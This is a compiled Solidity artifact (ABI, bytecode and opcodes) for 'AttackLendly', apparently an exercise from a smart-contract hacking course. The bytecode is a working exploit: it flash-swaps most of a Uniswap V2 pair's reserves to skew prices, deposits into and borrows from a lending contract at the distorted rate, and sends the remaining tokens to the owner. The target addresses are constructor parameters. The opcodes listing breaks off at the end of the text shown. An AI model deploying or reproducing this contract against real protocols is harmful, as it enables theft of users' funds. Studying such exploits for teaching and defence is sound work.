{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_pair",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_lendly",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount0",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "amount1",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "data",
          "type": "bytes"
        }
      ],
      "name": "uniswapV2Call",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "6101006040523480156200001257600080fd5b5060405162001255380380620012558339810160408190526200003591620001ba565b62000040336200014d565b6001600160a01b0380831660a081905290821660805260408051630dfe168160e01b81529051630dfe1681916004808201926020929091908290030181865afa15801562000092573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620000b89190620001f2565b6001600160a01b031660c0816001600160a01b03168152505060a0516001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000112573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001389190620001f2565b6001600160a01b031660e05250620002179050565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b80516001600160a01b0381168114620001b557600080fd5b919050565b60008060408385031215620001ce57600080fd5b620001d9836200019d565b9150620001e9602084016200019d565b90509250929050565b6000602082840312156200020557600080fd5b62000210826200019d565b9392505050565b60805160a05160c05160e051610f8e620002c7600039600081816101ad015281816103a4015281816108b901528181610b2f0152610b8301526000818161017201528181610366015281816103d00152818161073d015281816109f60152610a4a01526000818160be01528181610535015281816105cd015281816106820152818161078d015281816107fd015261090901526000818161025e0152818161030501526104080152610f8e6000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806310d1e85c1461005c578063715018a6146100715780638da5cb5b146100795780639e5faafc14610098578063f2fde38b146100a0575b600080fd5b61006f61006a366004610d24565b6100b3565b005b61006f610660565b600054604080516001600160a01b039092168252519081900360200190f35b61006f610674565b61006f6100ae366004610dba565b61097b565b336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461011b5760405162461bcd60e51b81526020600482015260086024820152673737ba103830b4b960c11b60448201526064015b60405180910390fd5b6001600160a01b03851630146101605760405162461bcd60e51b815260206004820152600a6024820152693737ba1039b2b73232b960b11b6044820152606401610112565b600061016e82840184610dba565b90507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316816001600160a01b031614806101e157507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316816001600160a01b0316145b61021b5760405162461bcd60e51b815260206004820152600b60248201526a3bb937b733903a37b5b2b760a91b6044820152606401610112565b60008515610229578561022b565b845b905060006103e861023d836001610dde565b6102479190610e0b565b60405163095ea7b360e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830152602482018390529192509084169063095ea7b3906044016020604051808303816000875af11580156102ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102de9190610e2d565b506040516311f9fbc960e21b81526001600160a01b038481166004830152602482018390527f000000000000000000000000000000000000000000000000000000000000000016906347e7ef2490604401600060405180830381600087803b15801561034957600080fd5b505af115801561035d573d6000803e3d6000fd5b505050506000807f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316856001600160a01b0316036103c95750506002547f0000000000000000000000000000000000000000000000000000000000000000906103f1565b50506001547f0000000000000000000000000000000000000000000000000000000000000000905b6040516370a0823160e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830181905291634b8a3529918591908216906370a0823190602401602060405180830381865afa158015610463573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104879190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401600060405180830381600087803b1580156104cd57600080fd5b505af11580156104e1573d6000803e3d6000fd5b5050505060006103e8856103e76104f89190610dde565b6105029190610e0b565b905060006103e8610514846004610dde565b61051e9190610e0b565b60405163a9059cbb60e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830152602482018590529192509088169063a9059cbb906044016020604051808303816000875af1158015610591573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105b59190610e2d565b5060405163a9059cbb60e01b81526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000811660048301526024820183905285169063a9059cbb906044016020604051808303816000875af1158015610625573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106499190610e2d565b506106526109f4565b505050505050505050505050565b610668610c65565b6106726000610cbf565b565b61067c610c65565b600060607f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156106de573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107029190610e84565b506001600160701b03908116600255166001819055606490610725906063610dde565b61072f9190610e0b565b604080516001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001660208201529193500160408051601f198184030181529082905263022c0d9f60e01b825291506001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000169063022c0d9f906107c990859060009030908790600401610f21565b600060405180830381600087803b1580156107e357600080fd5b505af11580156107f7573d6000803e3d6000fd5b505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610859573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061087d9190610e84565b506001600160701b03908116600281905591166001556064906108a1906063610dde565b6108ab9190610e0b565b604080516001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001660208201529193500160408051601f198184030181529082905263022c0d9f60e01b825291506001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000169063022c0d9f9061094590600090869030908790600401610f21565b600060405180830381600087803b15801561095f57600080fd5b505af1158015610973573d6000803e3d6000fd5b505050505050565b610983610c65565b6001600160a01b0381166109e85760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610112565b6109f181610cbf565b50565b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663a9059cbb610a356000546001600160a01b031690565b6040516370a0823160e01b81523060048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a0823190602401602060405180830381865afa158015610a99573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610abd9190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610b08573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b2c9190610e2d565b507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663a9059cbb610b6e6000546001600160a01b031690565b6040516370a0823160e01b81523060048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a0823190602401602060405180830381865afa158015610bd2573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bf69190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610c41573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109f19190610e2d565b6000546001600160a01b031633146106725760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726044820152606401610112565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6001600160a01b03811681146109f157600080fd5b600080600080600060808688031215610d3c57600080fd5b8535610d4781610d0f565b94506020860135935060408601359250606086013567ffffffffffffffff80821115610d7257600080fd5b818801915088601f830112610d8657600080fd5b813581811115610d9557600080fd5b896020828501011115610da757600080fd5b9699959850939650602001949392505050565b600060208284031215610dcc57600080fd5b8135610dd781610d0f565b9392505050565b6000816000190483118215151615610e0657634e487b7160e01b600052601160045260246000fd5b500290565b600082610e2857634e487b7160e01b600052601260045260246000fd5b500490565b600060208284031215610e3f57600080fd5b81518015158114610dd757600080fd5b600060208284031215610e6157600080fd5b5051919050565b80516001600160701b0381168114610e7f57600080fd5b919050565b600080600060608486031215610e9957600080fd5b610ea284610e68565b9250610eb060208501610e68565b9150604084015163ffffffff81168114610ec957600080fd5b809150509250925092565b6000815180845260005b81811015610efa57602081850181015186830182015201610ede565b81811115610f0c576000602083870101525b50601f01601f19169290920160200192915050565b84815283602082015260018060a01b0383166040820152608060608201526000610f4e6080830184610ed4565b969550505050505056fea2646970667358221220dff5c0fef33f3a6b4ea61ea383cbb312e30c735d3191bc43ac7f28f4c1d64b8c64736f6c634300080d0033",
  "bytecodeSha1": "c4834f5120242e6dd28aa6834c75ad85cfb3cf89",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.13+commit.abaa5c0e"
  },
  "contractName": "AttackLendly",
  "language": "Solidity",
  "natspec": {
    "author": "JohnnyTime (https://smartcontractshacking.com)",
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "title": "AttackLendly",
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x10D1E85C EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x71 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x79 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x98 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0xA0 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6F PUSH2 0x6A CALLDATASIZE PUSH1 0x4 PUSH2 0xD24 JUMP JUMPDEST PUSH2 0xB3 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6F PUSH2 0x660 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x6F PUSH2 0x674 JUMP JUMPDEST PUSH2 0x6F PUSH2 0xAE CALLDATASIZE PUSH1 0x4 PUSH2 0xDBA JUMP JUMPDEST PUSH2 0x97B JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0x11B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x8 PUSH1 0x24 DUP3 ADD MSTORE PUSH8 0x3737BA103830B4B9 PUSH1 0xC1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND ADDRESS EQ PUSH2 0x160 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x3737BA1039B2B73232B9 PUSH1 0xB1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x112 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x16E DUP3 DUP5 ADD DUP5 PUSH2 0xDBA JUMP JUMPDEST SWAP1 POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ DUP1 PUSH2 0x1E1 JUMPI POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x21B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xB PUSH1 0x24 DUP3 ADD MSTORE PUSH11 0x3BB937B733903A37B5B2B7 PUSH1 0xA9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x112 JUMP JUMPDEST PUSH1 0x0 DUP6 ISZERO PUSH2 0x229 JUMPI DUP6 PUSH2 0x22B JUMP JUMPDEST DUP5 JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x23D DUP4 PUSH1 0x1 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x247 SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE SWAP2 SWAP3 POP SWAP1 DUP5 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2BA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2DE SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH4 0x11F9FBC9 PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE PUSH32 0x0 AND SWAP1 PUSH4 0x47E7EF24 SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x349 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x35D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 DUP1 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SUB PUSH2 0x3C9 JUMPI POP POP PUSH1 0x2 SLOAD PUSH32 0x0 SWAP1 PUSH2 0x3F1 JUMP JUMPDEST POP POP PUSH1 0x1 SLOAD PUSH32 0x0 SWAP1 JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD DUP2 SWAP1 MSTORE SWAP2 PUSH4 0x4B8A3529 SWAP2 DUP6 SWAP2 SWAP1 DUP3 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x463 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x487 SWAP2 SWAP1 PUSH2 0xE4F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4CD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4E1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 PUSH2 0x3E8 DUP6 PUSH2 0x3E7 PUSH2 0x4F8 SWAP2 SWAP1 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x502 SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x514 DUP5 PUSH1 0x4 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x51E SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP6 SWAP1 MSTORE SWAP2 SWAP3 POP SWAP1 DUP9 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x591 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5B5 SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE DUP6 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x625 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x649 SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST POP PUSH2 0x652 PUSH2 0x9F4 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0x668 PUSH2 0xC65 JUMP JUMPDEST PUSH2 0x672 PUSH1 0x0 PUSH2 0xCBF JUMP JUMPDEST JUMP JUMPDEST PUSH2 0x67C PUSH2 0xC65 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x902F1AC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x6DE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x702 SWAP2 SWAP1 PUSH2 0xE84 JUMP JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP1 DUP2 AND PUSH1 0x2 SSTORE AND PUSH1 0x1 DUP2 SWAP1 SSTORE PUSH1 0x64 SWAP1 PUSH2 0x725 SWAP1 PUSH1 0x63 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x72F SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND PUSH1 0x20 DUP3 ADD MSTORE SWAP2 SWAP4 POP ADD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP1 DUP3 SWAP1 MSTORE PUSH4 0x22C0D9F PUSH1 0xE0 SHL DUP3 MSTORE SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND SWAP1 PUSH4 0x22C0D9F SWAP1 PUSH2 0x7C9 SWAP1 DUP6 SWAP1 PUSH1 0x0 SWAP1 ADDRESS SWAP1 DUP8 SWAP1 PUSH1 0x4 ADD PUSH2 0xF21 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x7E3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x7F7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x902F1AC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x859 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x87D SWAP2 SWAP1 PUSH2 0xE84 JUMP JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP1 DUP2 AND PUSH1 0x2 DUP2 SWAP1 SSTORE SWAP2 AND PUSH1 0x1 SSTORE PUSH1 0x64 SWAP1 PUSH2 0x8A1 SWAP1 PUSH1 0x63 PUSH2 0xDDE JUMP JUMPDEST PUSH2 0x8AB SWAP2 SWAP1 PUSH2 0xE0B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND PUSH1 0x20 DUP3 ADD MSTORE SWAP2 SWAP4 POP ADD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP1 DUP3 SWAP1 MSTORE PUSH4 0x22C0D9F PUSH1 0xE0 SHL DUP3 MSTORE SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND SWAP1 PUSH4 0x22C0D9F SWAP1 PUSH2 0x945 SWAP1 PUSH1 0x0 SWAP1 DUP7 SWAP1 ADDRESS SWAP1 DUP8 SWAP1 PUSH1 0x4 ADD PUSH2 0xF21 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x95F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x973 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0x983 PUSH2 0xC65 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x9E8 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A206E6577206F776E657220697320746865207A65726F2061 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x646472657373 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x112 JUMP JUMPDEST PUSH2 0x9F1 DUP2 PUSH2 0xCBF JUMP JUMPDEST POP JUMP JUMPDEST PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xA9059CBB PUSH2 0xA35 PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA99 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xABD SWAP2 SWAP1 PUSH2 0xE4F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 